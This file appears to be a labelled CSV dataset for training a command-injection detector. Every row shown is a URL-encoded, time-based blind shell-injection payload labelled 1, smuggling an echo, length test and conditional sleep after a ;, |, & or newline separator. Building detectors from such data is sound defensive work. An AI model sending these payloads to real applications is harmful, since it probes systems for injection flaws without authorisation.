Sentence,Label
%3B str%3D%24%28echo APHWVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%3B str%3D%24%28echo APHWVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%3B str%3D%24%28echo APHWVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%3B str%3D%24%28echo APHWVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%3B str%3D%24%28echo APHWVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi ,1
%7C %5B 1 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%7C %5B 2 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%7C %5B 3 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%7C %5B 4 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%7C %5B 5 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%7C %5B 6 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%7C %5B 7 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%7C %5B 8 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%7C %5B 9 -ne %24%28echo AWKJGV %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%26 sleep 0 %26%26 str%3D%24%28echo ITUCTB%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%0A str%3D%24%28echo UVFUKR%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi ,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%3B str%3D%24%28echo WLZIBA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %27,1
%7C %5B 1 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%7C %5B 2 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%7C %5B 3 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%7C %5B 4 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%7C %5B 5 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%7C %5B 6 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%7C %5B 7 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%7C %5B 8 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%7C %5B 9 -ne %24%28echo GQZIJB %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%26 sleep 0 %26%26 str%3D%24%28echo IFMAPS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%0A str%3D%24%28echo NNDFMH%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %27,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%3B str%3D%24%28echo TSUCKA%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %22,1
%7C %5B 1 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%7C %5B 2 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%7C %5B 3 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%7C %5B 4 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%7C %5B 5 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%7C %5B 6 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%7C %5B 7 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%7C %5B 8 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%7C %5B 9 -ne %24%28echo CWNAMN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%26 sleep 0 %26%26 str%3D%24%28echo STITDI%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%0A str%3D%24%28echo DPLQYS%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %22,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%3B str%3D%24%28echo TWCHKU%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %23,1
%7C %5B 1 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%7C %5B 2 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%7C %5B 3 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%7C %5B 4 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%7C %5B 5 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%7C %5B 6 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%7C %5B 7 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%7C %5B 8 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%7C %5B 9 -ne %24%28echo IZDFYZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%26 sleep 0 %26%26 str%3D%24%28echo GHGVOR%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%0A str%3D%24%28echo IKKWEG%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %23,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%3B str%3D%24%28echo MJSZOL%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi  /  / ,1
%7C %5B 1 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
%7C %5B 2 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
%7C %5B 3 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
%7C %5B 4 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
%7C %5B 5 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
%7C %5B 6 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
